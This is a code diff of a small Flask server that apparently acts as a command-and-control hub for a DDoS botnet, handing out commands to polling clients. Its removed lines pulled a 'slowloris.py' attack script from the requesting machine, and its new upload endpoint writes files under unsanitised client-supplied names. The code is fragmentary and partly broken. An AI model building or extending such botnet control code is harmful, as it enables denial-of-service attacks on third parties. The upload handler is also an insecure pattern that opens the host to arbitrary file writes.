@@ -1,6 +1,7 @@
-from flask import Flask, request, send_file
+from flask import Flask, request, send_file, request
 import socket
 import os
+import requests
 
 SLPort = "8888"
 
@@ -26,7 +27,7 @@ def set_action():
 	global current_command
 	global path
 	body = request.get_json()
-	print(body['command'], body['path'])
+	# print(body['command'], body['path'])
 	if "command" in body and body["command"] in avail_commands:
 		current_command = body["command"]
 		print(current_command)
@@ -45,18 +46,11 @@ def result():
 	return body
 
 @app.route("/repository", methods = ['POST'])
-def repository():
-	# while 1:
-    #     try:
-	r = requests.get("http://" + Flask.request.remote_addr, stream=True)
-	print(r)
-        #     with open('slowloris.py', 'wb') as out_file:
-        #         shutil.copyfileobj(r.raw, out_file)
-        #     return
-        # except Exception:
-        #     print("Error getting script from master")
-        #     continue
-
+def upload_file():
+	file = request.files['file']
+	file.save(os.path.join(".", file.filename))
+	return '200'
+    
 @app.route('/get_command', methods = ['GET'])
 def get_command():
     return current_command + " " + path
